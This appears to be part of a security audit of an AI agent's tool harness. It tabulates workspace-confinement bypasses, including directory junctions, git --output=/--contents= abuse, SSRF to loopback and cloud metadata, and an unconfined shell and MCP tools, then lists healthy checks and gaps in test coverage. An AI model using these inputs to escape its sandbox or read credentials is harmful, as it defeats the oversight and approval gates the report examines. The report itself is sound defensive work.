| 16 | `file://` URL | `file:///C:/Windows/win.ini` | allowed by the guard, fails at the OS | `paths.ts:42`; `fs.ts:328` `ENOENT` | no escape; `write_file('file:secret.txt')` makes an ADS named `secret.txt` on a file called `file` |
| 17 | Unicode homoglyphs | `..．．\evil`, `..∕..∕evil` | allowed (as literal names) | — | `U+FF0E`/`U+2215` are not separators to Windows or Node |
| 18 | NUL byte in path | `a\u0000b` | allowed | — | reaches `fs`, which rejects it; no crash (guarded) |
| 19 | enormous path | `a/`×5000 | allowed | — | no length bound in `paths.ts`; the OS fails it. `write_file` would `mkdirSync(recursive)` the whole chain |
| 20 | **directory junction** | `symlinkSync(outside, ws/'escape-link', 'junction')` then `read_file('escape-link/secret.txt')` | **NOT BLOCKED — escape** | `paths.ts:36-47` is lexical; `fs.ts:161/170` follows | **proven read of an outside file** |
| 21 | **junction, write** | `write_file('escape-link/pwned.txt')` | **NOT BLOCKED — escape** | `fs.ts:326-330` | file created outside the root |
| 22 | **junction, edit** | `edit_file` / `apply_patch` on `link-to-outside/secret.txt` | **NOT BLOCKED — escape** | `fs.ts:373-400`, `code.ts:457/530` | outside file rewritten to `PATCHED-OUTSIDE` |
| 23 | **junction, list** | `list_dir('link-to-outside')` | **NOT BLOCKED — escape** | `fs.ts:125-127` (`statSync` follows) | target directory listed |
| 24 | junction via walkers | `glob('**/*')`, `grep`, `search_files` | not followed (so not a vector) | `code.ts:72-75`, `fs.ts:217-221` — `Dirent.isDirectory()` is false for a link | luck: also means linked files are silently invisible |
| 25 | file symlink | `symlinkSync(file, ws/'innocent.txt')` | **not measured** | — | symlink creation returned `EPERM` in this sandbox; same code path as #20-23 |
| 26 | pre-existing junction | `apps/server/node_modules/{tsx,typescript,ws,sqlite-vec}` | **present by default, escapes** | as #20 | 51 reparse points below depth 3 of this repo |
| 27 | case-folded sibling | root `...\ws`, target `...\wsX\f.txt` | **blocked** (correct) | `paths.ts:42-46` | the `..` path is caught; the `key()` case risk is the direct-absolute form (#28) |
| 28 | case-sensitive NTFS | absolute path spelled through a case-variant of the root | allowed (lexically "inside") | `paths.ts:17-19` | **SUSPECTED** — needs `setCaseSensitiveInfo` to exploit |
| 29 | hard link | n/a | not reachable from a built-in tool | — | `run_shell`/MCP only; no `linkSync` in `tools/*` |
| 30 | `run_shell` any path | `type <outside>\secret.txt` | **not confined at all** | `shell.ts:163-210` never calls the guard | `spawn EPERM` in this sandbox; the code path has no check |
| 31 | `run_shell` env | `node -e "…process.env…"` | keys inherited by design | `shell.ts:65-70` (no `env:`), `config.ts:60-63` | unexercised here (sandbox had no keys set) |
| 32 | `git --output=` | `git log --output=<outside> --format="%n@echo off%ncalc.exe%n"` | **NOT BLOCKED — escape + write** | `git.ts:64-74` is exact-match; `git.ts:268` uses `Set.has` | git honoured it: 21 bytes with newlines written outside |
| 33 | `git --contents=` | `git blame --contents=C:/Windows/win.ini -- README.md` | **NOT BLOCKED — escape + read** | `git.ts:30-44`, `git.ts:279-287` | win.ini printed into the tool result |
| 34 | `git --exec=` / `--upload-pack=` | `git diff --no-index`, `rev-parse --upload-pack=calc` | partially blocked | `--no-index` and exact `--upload-pack` are in `READ_ONLY_FORBIDDEN`; the `=` forms are not | unreachable with the current subcommand enum, but the gap is the same bug |
| 35 | `git remote add` | `git remote add origin https://evil.example/x.git` | **NOT BLOCKED, no approval** | `git.ts:30-44` + `git.ts:204-208` | writes `.git/config` unapproved |
| 36 | `git commit -n` | `git commit -n -m x` | allowed (approval asked) | `git.ts:64-74` has `--no-verify` but not `-n` | skips the hooks the tool says it protects |
| 37 | `git checkout <branch>` | `git checkout main` | **blocked** | `git.ts:251-266` | only `-b`/`-B` |
| 38 | `git` shell metacharacters | `git log --pretty=%H; touch canary` | inert | `git.ts:137` `shell:false` | correct, and tested (`plan.test.ts:393`) |
| 39 | web SSRF, loopback | `http://127.0.0.1:52527/secret` | **NOT BLOCKED** | `web.ts:87-95` checks only the protocol | loopback content returned |
| 40 | web SSRF, redirect | `http://127.0.0.1:52527/redirect` → `/secret` | **NOT BLOCKED** | `web.ts:100` `redirect:'follow'` | redirect followed, no re-validation |
| 41 | web SSRF, metadata | `http://169.254.169.254/latest/meta-data/` | **attempted, not refused** | `web.ts:87-95` | network error here because nothing answers; on a cloud VM this is a credential read |
| 42 | web SSRF, own API | `http://127.0.0.1:8787/api/state` | **NOT BLOCKED** | `web.ts:87-95` | 200 + office state JSON |
| 43 | web, non-http scheme | `file://`, `gopher://` | **blocked** | `web.ts:93-95` | correct |
| 44 | web, response size | 400 MB body | not capped before buffering | `web.ts:103` `await res.text()` | +412 MB RSS measured |
| 45 | MCP tool path | any `mcp__*__*` call | **not confined** | `mcp/manager.ts:305-317` ignores `ctx.workspaceRoot` | no approval either |
| 46 | plugin tool path | `PluginTool.run` | **not enforced** | `plugins/host.ts:279-300` | passes `workspaceRoot`, enforces nothing |

---

## Verified healthy

These I actively tried to break and could not:

1. **`..`, absolute, UNC, `\\?\`, `\\.\`, drive-relative (`C:foo`), mixed separators, 8.3, trailing
   dot/space escapes, `file://`, Unicode homoglyphs** — all blocked or inert (matrix #1-19). The lexical
   guard is genuinely solid *as a lexical guard*, and `DRIVE_RELATIVE_RE` (`paths.ts:14`) is the reason
   the classic `C:foo` trick fails, which the test at `tools.test.ts:35-47` does pin down.
2. **`git` does not run a shell.** `shell:false` at `git.ts:137` and an argv array at `git.ts:315`;
   `--pretty=%H; touch canary` created no file. Tested (`plan.test.ts:393-411`). Metacharacters are inert.
3. **`git checkout` to an existing branch is refused** (`git.ts:251-266`) — the reasoning (switching can
   discard uncommitted work) is implemented, not just documented.
4. **The `git` write gate is correctly *bound to the subcommand*.** `stash pop`, `stash drop`,
   `stash clear`, `tag -d`, `commit`, `add`, `cherry-pick`, `checkout -b` all asked for approval before
   spawning; `status`, `diff`, `log`, `show`, `branch -v`, `rev-parse`, `ls-files` did not
   (`git.ts:204-208`, `git.ts:296-313`), and the probe confirmed the approval summary is the exact
   command (`git stash drop`, `git commit -m save`).
5. **Approval cannot be self-approved by the built-in tools.** There is no HTTP route for an approval
   decision — decisions arrive on the websocket (`index.ts:643`) — and `web_fetch` is GET-only, so the
   obvious self-approval loop is closed. `web_fetch` *can* read `/api/state`, but that route carries no
   secret: `ProviderStatus` (`packages/core/src/events.ts:19-48`) has no key field,
   `runtime.ts:1199-1212` builds it from `registry.status()`, and the API key is deliberately never put
   in a settings document (`config.ts:256-263`).
6. **Approval timeout fails closed.** `config.ts:550` defaults to 600 000 ms;
   `runtime.ts:1176-1183` calls `resolveApproval(id, false, 'timed out')`, and there is exactly one
   resolution path (`runtime.ts:1016-1032`) so the store, the event stream and the waiting tool cannot
   disagree. A denied or unanswered request returns `ok:false` with an instruction not to retry
   (`shell.ts:188-197`, `git.ts:307-312`, `vendor.ts:169-175`).
7. **ACP permission requests default to refuse.** `vendors/acp.ts:600-633`: an option list with no
   allow-like entry, or no `requestApproval` callback at all, yields `cancelled`/`reject`, never a guess
   at the permissive option. `fs/write_text_file` is refused outright (`acp.ts:364-371`) and
   `fs/read_text_file` goes through `resolveInWorkspace` (`acp.ts:354`), so the *read* half of a
   delegation is at least as confined as `read_file` — i.e. it inherits finding C1 but nothing worse.
8. **`apply_patch` is atomic and refuses ambiguity.** Nothing is written until every `*** Find:` block
   validates; a missing or duplicated block aborts the whole patch (`code.ts:448-521`), tested at
   `code.test.ts:464-513`. `edit_file` refuses >1 occurrence without `replaceAll` (`fs.ts:389-395`).
9. **`search_files`/`glob`/`grep` skip `node_modules` and `.git`** (`match.ts:17`, `fs.ts:96`,
   `code.ts:73`) and cap their output with an honest truncation marker (`fs.ts:132`, `fs.ts:296`,
   `code.ts:301`, `code.ts:316`, `code.ts:156`).
10. **Tool output truncation is honest where it exists.** `engine/turn.ts:49-51` appends
    `"… [result truncated at 8000 characters]"`; `shell.ts:124` appends `(output truncated)`;
    `git.ts:327` appends `(output truncated at 20000 characters)`; `mcp/manager.ts:332-335` appends
    `…(truncated at 20000 characters)`. The 400 MB fetch returned exactly 20 055 characters with the
    `…` marker.
11. **Tools are dispatched sequentially per turn** (`engine/turn.ts:503-512`), so there is no
    concurrent-writer race between two tool calls in one turn; `writtenPaths` is threaded by reference
    (`turn.ts:175`) so a parallel run cannot contaminate another project's record.
12. **The tool registry's surface is pinned.** `tools.test.ts:206-210` asserts the registry offers
    exactly `TOOL_IDS` — I counted the list at `org/defaultCompany.ts:63-79`: **15 tools, matching the
    README**. A new tool cannot be added without that test failing.

---

## Coverage gaps

What the 74-test `src/tools` suite proves, and what it only asserts:

| Claimed property | Proven by a test? | Where |
| --- | --- | --- |
| `..` / absolute / `C:foo` / `D:bar` rejected | **yes** | `tools.test.ts:35-47` |
| `apply_patch` refuses `../escape.txt` | **yes** | `code.test.ts:529-541` |
| `glob` refuses `path: '../..'` | **yes** | `code.test.ts:158-167` |
| shell does not run when approval is declined | **yes** | `tools.test.ts:131-151` |
| shell *does* run when approved | skipped in a sandbox | `tools.test.ts:169-194` |
| git asking/not asking per subcommand | **yes** | `plan.test.ts:227-334` |
| git refuses `--force`, `--hard`, `--no-verify` (exact form) | **yes** | `plan.test.ts:197-212` |
| git has no shell | skipped in a sandbox | `plan.test.ts:393-411` |
| registry == `TOOL_IDS` | **yes** | `tools.test.ts:196-219` |
| **symlink/junction confinement** | **no test anywhere** | — |
| **`git --output=`, `--contents=`, `-n`, `remote add`, `branch <name>`** | **no test** | the deny-list tests only pass bare `--force`/`--hard`/`--no-verify` |
| **`run_shell` env inheritance** | **no test** | `shell.ts:65-70` |
| **`run_shell` timeout vs grandchildren** | **no test** | `shell.ts:84-91` (no `detached`, no tree kill) |
| **shell output cap on both streams / total bytes** | **no test** | `shell.ts:46-61`: one shared `totalChars` budget across stdout+stderr, counted in UTF-16 code units, and the marker only appears if a *single* chunk overflows the remaining budget — a chunk of exactly `MAX_OUTPUT_CHARS` produces no `(output truncated)` marker |
| **`web_fetch` host/scheme/redirect/size** | **no test** | only the protocol check exists (`web.ts:93`), untested |
| **MCP tool confinement** | **no test** | `mcp/manager.test.ts` exercises plumbing, not the boundary |
| **plugin tool confinement** | **no test** | `plugins.test.ts:504-524` registers a tool and asserts it runs |
| **reserved device names / ADS** | **no test** | unguarded in `paths.ts` |
| **`toWorkspaceRelative` outside the root** | **no test** (and the two callers disagree) | `vendor.ts:242-250` vs `vendors/acp.ts:558-564` |
| **approval cannot be self-approved** | **no test** | the closed loop is real but unasserted |
| **`autoApproveShell` blast radius** | **no test** that it covers git *and* vendors *and* shell together | `plan.test.ts:298-316` covers git only |

Suggested order if these are turned into work: (1) a junction + file-symlink test against
`resolveInWorkspace` and all five fs/code tools; (2) a `git` option-surface test with the `=` spellings
and `-n`, plus `remote add`; (3) a test that a child of `run_shell`/`git` does not see
`*_API_KEY`; (4) an SSRF test with a loopback listener and a redirect; (5) an output-size test with a
streaming origin.

---

## Summary of severities

| Severity | Count | Items |
| --- | --- | --- |
| CRITICAL | 2 | junction/symlink escape; `git --output=` + `--contents=` |
| HIGH | 3 | `.git` hooks/config writable ungated → approved git command runs attacker code with keys; `run_shell` unconfined + env key inheritance; MCP/plugin tools bypass confinement entirely |
| MEDIUM | 5 | `web_fetch` SSRF (loopback/metadata/redirect, own API); unbounded response buffering (+412 MB measured); one boolean removes three approval gates; `git remote`/`branch` unapproved writes + `remote update` network; unauthenticated `POST /api/settings` self-escalation |
| LOW | 7 | device names; ADS; case-folded containment key; `vendor.ts` dead containment branch; plugin entry prefix check; shell timeout vs grandchildren; no control-char sanitisation |
| INFO | 2 | what the lexical guard gets right; the precise status of the README claim |

**The "every tool is confined to the run's workspace root" claim: FAILS.** It fails for `run_shell` by
construction (no path check at all), for every MCP and plugin tool (which are in the same registry and
the same grant model), and — decisively — for the five path-based built-ins via junctions/symlinks that
already exist in a normal `node_modules`. The narrower statement the README *could* make and defend is:
"15 built-in tools whose path arguments are lexically restricted to the run's workspace root; one of
them (`run_shell`) is unrestricted and approval-gated instead".
